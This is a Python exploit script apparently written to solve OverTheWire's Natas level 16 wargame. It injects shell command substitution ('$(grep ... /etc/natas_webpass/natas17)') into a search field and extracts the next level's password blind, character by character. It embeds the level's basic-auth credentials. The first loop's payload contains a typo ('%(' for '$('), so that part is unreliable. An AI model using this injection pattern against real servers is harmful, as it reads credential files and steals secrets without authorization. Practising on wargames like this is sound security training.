import requests
from requests.auth import HTTPBasicAuth

url = "http://natas16.natas.labs.overthewire.org"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
available_chars = ""
true_string = "dog"
password = ""



print("Getting the chars that the password contains!")
for char in chars:
    data_to_give = {"needle" : 'dog%(grep ' + char + ' /etc/natas_webpass/natas17)'}
    r = requests.post(url, auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=data_to_give)
    if true_string not in r.text:
        available_chars = available_chars + char


#using those values build a password
print("\n\nGetting the password now!")

#check if any of the available chars match the current char of the password
#we did range(0,32) because it's the length of the password
for i in range(0,32):
    for char in available_chars:
	#the ^ is a regular expression that says "match expression at the start of a line"
        data_to_give = {"needle" : 'dog$(grep ^' + password + char + ' /etc/natas_webpass/natas17)'}
        r = requests.post(url, auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=data_to_give)
        if true_string not in r.text:
            password = password + char
            print(password)



print("\nDone!")
print("The password is " + password)
